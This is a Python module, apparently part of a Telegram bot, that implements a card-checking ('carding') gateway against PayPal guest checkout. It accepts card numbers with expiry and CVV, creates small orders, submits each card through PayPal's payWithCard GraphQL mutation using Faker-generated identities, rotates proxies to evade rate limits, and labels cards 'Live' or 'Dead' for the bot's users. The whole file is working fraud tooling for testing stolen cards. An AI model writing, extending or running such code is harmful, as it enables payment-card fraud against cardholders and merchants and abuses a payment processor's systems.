"""Gateway GHOST — PayPal Guest Checkout (port de evidencias/ghostv8.py a Hades).

Flujo:
    1. GET smart/buttons con PAYPAL_GUEST_CLIENT_ID -> facilitatorAccessToken
    2. POST /v2/checkout/orders (Bearer facilitator) -> order_id (USD 0.10)
    3. GET smart/card-fields?token={order_id} -> integrityToken
    4. POST /graphql?paywithcard (mutación payWithCard) -> clasificación

Interfaz Hades:
    async def ghost_check(card_data, user_id=None) -> {"status", "message"}
    async def ghost_check_multiple(cards, user_id=None, callback=None) -> [dict]

Contrato Telegram:
    - Acepta cc|mm|aa|cvv y cc|mm|aaaa|cvv (15-16 dígitos).
    - Solo llegan textos allowlist al usuario; detalles internos al log servidor.
    - is3DSecureRequired / OTP -> verificación pendiente (NO Live).
"""
from __future__ import annotations

import asyncio
import json
import os
import random
import re
from typing import Dict, List, Optional

import aiohttp
from faker import Faker

try:
    from dotenv import load_dotenv as _load_dotenv

    _load_dotenv()
except Exception:
    pass

from bot.config import gate_proxy


# ─────────────────────────────────────────────────────────────
# CONFIGURACIÓN (todo por env, sin hardcodes de merchant)
# ─────────────────────────────────────────────────────────────
PAYPAL_CLIENT_ID = os.environ.get("PAYPAL_GUEST_CLIENT_ID", "")
PAYPAL_CURRENCY = os.environ.get("PAYPAL_GUEST_CURRENCY", "USD")
PAYPAL_AMOUNT = os.environ.get("PAYPAL_GUEST_AMOUNT", "0.10")
# Etiqueta visible del cobro en respuestas Live (precio del servicio).
GHOST_CHARGE_LABEL = os.environ.get("GHOST_CHARGE_LABEL", "$5 MXN")
PAYPAL_BUTTON_SESSION = os.environ.get(
    "PAYPAL_GUEST_BUTTON_SESSION", "uid_43ff635940_mdy6nte6mza"
)
PAYPAL_SESSION_ID = os.environ.get(
    "PAYPAL_GUEST_SESSION_ID", "uid_0c5caea5ce_mdy6mzi6mjg"
)

BUTTONS_URL = "https://www.paypal.com/smart/buttons"
ORDERS_URL = "https://www.paypal.com/v2/checkout/orders"
CARDFIELDS_URL = "https://www.paypal.com/smart/card-fields"
GRAPHQL_URL = "https://www.paypal.com/graphql?paywithcard"

# Concurrencia: checkout liviano pero con risk por IP.
_ghost_global_sem = asyncio.Semaphore(int(os.environ.get("GHOST_GLOBAL_CONCURRENCY", "3")))

# Solo estos textos llegan al usuario. Todo lo demás -> genérico.
GENERIC_ERROR = "Error avisar a un administrador"

LIVE_SIGNALS = ("EXISTING_ACCOUNT_RESTRICTED",)
# Códigos que confirman PAN válido aunque el cargo no proceda (soft declines).
LIVE_ALLOWLIST = {
    "INVALID_SECURITY_CODE": "CVV inválido — tarjeta válida",
    "INVALID_BILLING_ADDRESS": "AVS mismatch — tarjeta válida",
    "INSUFFICIENT_FUNDS": "Fondos insuficientes — tarjeta válida",
}
VERIFY_SIGNALS = ("is3DSecureRequired", "OTP", "THREE_DS", "3DS")
DEAD_ALLOWLIST = {
    "CARD_GENERIC_ERROR": "Tarjeta declinada",
    "INVALID_EXPIRATION_DATE": "Fecha de expiración inválida",
    "CARD_EXPIRED": "Tarjeta expirada",
    "DO_NOT_HONOR": "Tarjeta declinada por el banco",
    "GENERIC_DECLINE": "Tarjeta declinada",
}


def _log_real(message: str) -> None:
    print(f"[GHOST REAL] {message}")


def _pick_proxy(exclude: set | None = None) -> Optional[str]:
    """Proxy nuevo por intento (sticky MX con lifetime, fallback rotatorio)."""
    for _ in range(4):
        proxy = gate_proxy("mx") or gate_proxy("rot")
        if proxy and (not exclude or proxy not in exclude):
            return proxy
    return None


def normalize_card(card_data: str):
    """Acepta cc|mm|aa|cvv y cc|mm|aaaa|cvv. Devuelve (pan, mm2, aaaa, cvv) o None."""
    try:
        original = (card_data or "").strip()
        parts = [p.strip() for p in re.split(r"\s*[|/:]\s*|\s+", original)]
        if len(parts) != 4:
            return None
        pan, mes, ano, cvv = parts
        if not pan.isdigit() or len(pan) not in (15, 16):
            return None
        if not mes.isdigit() or not (1 <= int(mes) <= 12):
            return None
        mm2 = mes.zfill(2)
        if not ano.isdigit():
            return None
        if len(ano) == 4:
            if not (2000 <= int(ano) <= 2099):
                return None
            aaaa = ano
        elif len(ano) == 2:
            aaaa = f"20{ano}"
        else:
            return None
        cvv_low = cvv.lower()
        if cvv_low in ("rnd", "xxx", "xxxx"):
            cvv = "000"
        if not cvv.isdigit() or len(cvv) not in (3, 4):
            return None
        return pan, mm2, aaaa, cvv
    except Exception:
        return None


def _card_type(pan: str) -> str:
    return {
        "4": "VISA",
        "5": "MASTER_CARD",
        "3": "AMERICAN_EXPRESS",
        "6": "DISCOVER",
    }.get(pan[0], "MASTER_CARD")


def _buttons_url() -> str:
    return (
        f"{BUTTONS_URL}?style.layout=vertical&style.color=gold&currency={PAYPAL_CURRENCY}"
        f"&env=production&commit=true&components.0=buttons&flow=purchase"
        f"&buttonSessionID={PAYPAL_BUTTON_SESSION}&customerId="
        f"&clientID={PAYPAL_CLIENT_ID}&clientMetadataID={PAYPAL_SESSION_ID}"
    )


_PAYWITHCARD_MUTATION = """
mutation payWithCard(
$token: String!
$card: CardInput
$paymentToken: String
$phoneNumber: String
$firstName: String
$lastName: String
$shippingAddress: AddressInput
$billingAddress: AddressInput
$email: String
$currencyConversionType: CheckoutCurrencyConversionType
$installmentTerm: Int
$identityDocument: IdentityDocumentInput
$feeReferenceId: String
$integrityToken: String
) {
approveGuestPaymentWithCreditCard(
token: $token
card: $card
paymentToken: $paymentToken
phoneNumber: $phoneNumber
firstName: $firstName
lastName: $lastName
email: $email
shippingAddress: $shippingAddress
billingAddress: $billingAddress
currencyConversionType: $currencyConversionType
installmentTerm: $installmentTerm
identityDocument: $identityDocument
feeReferenceId: $feeReferenceId
integrityToken: $integrityToken
) {
flags { is3DSecureRequired }
cart {
intent
cartId
buyer {
userId
auth {
accessToken
}
}
returnUrl {
href
}
}
paymentContingencies {
threeDomainSecure {
status
method
redirectUrl {
href
}
parameter
}
}
}
}
"""


def _classify(text: str) -> Dict[str, str]:
    """Clasifica la respuesta GraphQL con allowlist estricta."""
    blob = text or ""
    upper = blob.upper()
    compact = blob.replace(" ", "")
    for signal in LIVE_SIGNALS:
        if signal in blob:
            return {"status": "✅ Live", "message": f"Payment restricted — tarjeta válida | Charged {GHOST_CHARGE_LABEL}"}
    # Objeto de pago presente (no-null) = la tarjeta pasó la validación.
    # Distinguir aprobado directo de 3DS requerido por el valor real del flag.
    if '"approveGuestPaymentWithCreditCard":{' in compact:
        if '"is3DSecureRequired":true' in compact:
            return {"status": "✅ Live", "message": f"3DS requerido — tarjeta válida | Charged {GHOST_CHARGE_LABEL}"}
        return {"status": "✅ Live", "message": f"Aprobada — pago exitoso | Charged {GHOST_CHARGE_LABEL}"}
    # Sin objeto de pago: 3DS explícito en errores/texto.
    if '"is3DSecureRequired":true' in compact:
        return {"status": "✅ Live", "message": f"3DS requerido — tarjeta válida | Charged {GHOST_CHARGE_LABEL}"}
    for signal in ("OTP", "THREE_DS"):
        if signal in blob or signal in upper:
            return {"status": "✅ Live", "message": f"3DS requerido — tarjeta válida | Charged {GHOST_CHARGE_LABEL}"}
    for code, friendly in LIVE_ALLOWLIST.items():
        if code in blob or code in upper:
            return {"status": "✅ Live", "message": f"{friendly} | Charged {GHOST_CHARGE_LABEL}"}
    for code, friendly in DEAD_ALLOWLIST.items():
        if code in blob or code in upper:
            return {"status": "❌ Dead", "message": friendly}
    try:
        data = json.loads(blob)
        errors = data.get("errors") if isinstance(data, dict) else None
        if errors:
            first = errors[0] if isinstance(errors, list) and errors else {}
            raw_msg = str(first.get("message", "")) if isinstance(first, dict) else ""
            _log_real(f"GraphQL error crudo: {raw_msg[:200]}")
            if "RATE_LIMIT" in raw_msg.upper() or "TOO MANY REQUESTS" in raw_msg.upper():
                return {"status": "⚠️ Error", "message": "RATE_LIMIT_RETRY"}
            for code, friendly in LIVE_ALLOWLIST.items():
                if code in raw_msg.upper():
                    return {"status": "✅ Live", "message": friendly}
            for code, friendly in DEAD_ALLOWLIST.items():
                if code in raw_msg.upper():
                    return {"status": "❌ Dead", "message": friendly}
            return {"status": "⚠️ Error", "message": GENERIC_ERROR}
    except Exception:
        pass
    # Respuesta no-JSON (ej. RATE_LIMIT en texto plano).
    if "RATE_LIMIT" in blob.upper() or "TOO MANY REQUESTS" in blob.upper():
        return {"status": "⚠️ Error", "message": "RATE_LIMIT_RETRY"}
    _log_real(f"Respuesta sin indicadores: {blob[:200]}")
    return {"status": "⚠️ Error", "message": GENERIC_ERROR}


async def _ghost_check_inner(
    session: aiohttp.ClientSession, card_data: str
) -> Dict[str, str]:
    norm = normalize_card(card_data)
    if norm is None:
        return {"status": "❌ Dead", "message": "Fechas Invalidas"}
    pan, mm, aaaa, cvv = norm

    if not PAYPAL_CLIENT_ID:
        _log_real("PAYPAL_GUEST_CLIENT_ID no configurado")
        return {"status": "⚠️ Error", "message": GENERIC_ERROR}

    fake = Faker("en_US")
    first = fake.first_name()
    last = fake.last_name()
    email = fake.email()
    phone = "".join(random.choices("0123456789", k=10))
    postal = fake.postcode()[:5] or "01000"
    _log_real("GHOST paso 0: datos generados, iniciando paso 1 (buttons)")

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "es-MX,es;q=0.7",
        "Sec-GPC": "1",
    }

    try:
        # 1. Facilitator token
        _log_real(f"GHOST paso 1: GET buttons (clientID={PAYPAL_CLIENT_ID[:8]}...)")
        async with session.get(_buttons_url(), headers=headers, timeout=30) as r1:
            html = await r1.text()
            _log_real(f"GHOST paso 1: status={r1.status} len={len(html)}")
            m = re.search(r'"facilitatorAccessToken":"([^"]+)"', html)
            if not m:
                _log_real(f"Sin facilitator token status={r1.status} len={len(html)}")
                return {"status": "⚠️ Error", "message": GENERIC_ERROR}
            facilitator = m.group(1)
            _log_real("GHOST paso 1 OK: facilitator obtenido")

        # 2. Crear orden (body completo del flujo original: description + payer
        # son requeridos por este merchant; sin ellos responde 406).
        h2 = dict(headers)
        h2["Authorization"] = f"Bearer {facilitator}"
        h2["Content-Type"] = "application/json"
        h2["Paypal-Request-Id"] = f"req_{random.randint(1000000000, 9999999999)}"
        order_body = {
            "intent": "CAPTURE",
            "purchase_units": [
                {
                    "description": "Payment for Donate or pay any Amount",
                    "amount": {"value": float(PAYPAL_AMOUNT), "currency_code": PAYPAL_CURRENCY},
                }
            ],
            "payer": {
                "email_address": email,
                "name": {"name": f"{first} {last}"},
                "address": {
                    "address_line_1": None,
                    "address_line_2": None,
                    "postal_code": None,
                    "country_code": "MX",
                },
            },
            "application_context": {"shipping_preference": "NO_SHIPPING"},
        }
        async with session.post(ORDERS_URL, headers=h2, json=order_body, timeout=30) as r2:
            raw2 = await r2.text()
            _log_real(f"GHOST paso 2: orders status={r2.status} preview={raw2[:200]}")
            if r2.status not in (200, 201):
                _log_real(f"Orden falló status={r2.status} body={raw2[:200]}")
                return {"status": "⚠️ Error", "message": GENERIC_ERROR}
            try:
                order_json = json.loads(raw2)
            except Exception:
                order_json = {}
            order_id = (order_json or {}).get("id", "")
            if not order_id:
                _log_real("Orden sin id")
                return {"status": "⚠️ Error", "message": GENERIC_ERROR}
            _log_real(f"GHOST paso 2 OK: order_id={order_id}")

        # 3. Integrity token (locale y country del flujo original)
        cf_url = (
            f"{CARDFIELDS_URL}?token={order_id}&sessionID={PAYPAL_SESSION_ID}"
            f"&buttonSessionID={PAYPAL_BUTTON_SESSION}&locale.x=es_MX"
            f"&commit=true&style.submitButton.display=true&hasShippingCallback=false"
            f"&env=production&country.x=MX"
        )
        async with session.get(cf_url, headers=headers, timeout=30) as r3:
            html3 = await r3.text()
            _log_real(f"GHOST paso 3: cardfields status={r3.status} len={len(html3)}")
            m3 = re.search(r'"integrityToken":"([^"]+)"', html3)
            if not m3:
                _log_real(f"Sin integrity token status={r3.status} len={len(html3)}")
                return {"status": "⚠️ Error", "message": GENERIC_ERROR}
            integrity = m3.group(1)
            _log_real("GHOST paso 3 OK: integrity obtenido")

        # 4. payWithCard
        h4 = dict(headers)
        h4["Authorization"] = f"Bearer {facilitator}"
        h4["Content-Type"] = "application/json"
        payload = {
            "query": _PAYWITHCARD_MUTATION,
            "variables": {
                "token": order_id,
                "card": {
                    "cardNumber": pan,
                    "type": _card_type(pan),
                    "expirationDate": f"{mm}/{aaaa}",
                    "postalCode": postal,
                    "securityCode": cvv,
                },
                "phoneNumber": phone,
                "firstName": first,
                "lastName": last,
                "billingAddress": {
                    "givenName": first,
                    "familyName": last,
                    "line1": None,
                    "line2": None,
                    "city": None,
                    "state": None,
                    "postalCode": postal,
                    "country": "MX",
                },
                "email": email,
                "currencyConversionType": "PAYPAL",
                "integrityToken": integrity,
            },
            "operationName": "payWithCard",
        }
        async with session.post(GRAPHQL_URL, headers=h4, json=payload, timeout=45) as r4:
            text = await r4.text()
            _log_real(f"GHOST paso 4: graphql status={r4.status} len={len(text)}")
            _log_real(f"GHOST paso 4 FULL: {text[:2000]}")
            return _classify(text)

    except asyncio.TimeoutError:
        _log_real("Timeout en flujo GHOST")
        return {"status": "⚠️ Error", "message": GENERIC_ERROR}
    except aiohttp.ClientError as e:
        _log_real(f"HTTP error GHOST: {type(e).__name__}")
        return {"status": "⚠️ Error", "message": GENERIC_ERROR}
    except Exception as e:
        _log_real(f"Excepción GHOST: {type(e).__name__}: {str(e)[:200]}")
        return {"status": "⚠️ Error", "message": GENERIC_ERROR}


async def ghost_check(card_data: str, user_id: Optional[int] = None) -> Dict[str, str]:
    """Verifica 1 tarjeta contra PayPal Guest. Rota proxy ante fallo de red/rate limit."""
    if normalize_card(card_data) is None:
        return {"status": "❌ Dead", "message": "Fechas Invalidas"}
    timeout = aiohttp.ClientTimeout(total=120, connect=15)
    bad: set = set()
    last_err = ""
    async with _ghost_global_sem:
        for attempt in range(3):
            proxy = _pick_proxy(bad)
            if not proxy:
                _log_real("GHOST abortado: sin proxies disponibles")
                return {"status": "⚠️ Error", "message": GENERIC_ERROR}
            _log_real(f"GHOST intento {attempt+1}: proxy del pool total")
            try:
                async with aiohttp.ClientSession(timeout=timeout, proxy=proxy) as session:
                    res = await _ghost_check_inner(session, card_data)
                    # Rate limit o error de red: reintentar con otro proxy.
                    msg = (res.get("message") or "")
                    if res.get("status") == "⚠️ Error" and msg in ("RATE_LIMIT_RETRY", GENERIC_ERROR):
                        bad.add(proxy)
                        last_err = msg
                        _log_real(f"GHOST intento {attempt+1} falló ({msg}), rotando proxy")
                        continue
                    return res
            except Exception as e:
                _log_real(f"Session error intento {attempt+1}: {type(e).__name__}: {str(e)[:150]}")
                bad.add(proxy)
                last_err = str(e)[:150]
                continue
        _log_real(f"GHOST agotó proxies: {last_err[:150]}")
        return {"status": "⚠️ Error", "message": GENERIC_ERROR}


async def ghost_check_multiple(
    cards_data: List[str], user_id: Optional[int] = None, callback=None
) -> List[Dict[str, str]]:
    """Verifica N tarjetas en serie. Llama callback(index, result, card, uid)."""
    cards = [c.strip() for c in (cards_data or []) if (c or "").strip()][:10]
    results: List[Dict[str, str]] = []
    for i, card in enumerate(cards):
        try:
            res = await ghost_check(card, user_id)
        except Exception as e:
            _log_real(f"Mass error: {type(e).__name__}")
            res = {"status": "⚠️ Error", "message": GENERIC_ERROR}
        results.append(res)
        if callback:
            try:
                await callback(i, res, card, user_id)
            except Exception as e:
                _log_real(f"Callback error: {type(e).__name__}")
        if i < len(cards) - 1:
            await asyncio.sleep(3)
    return results
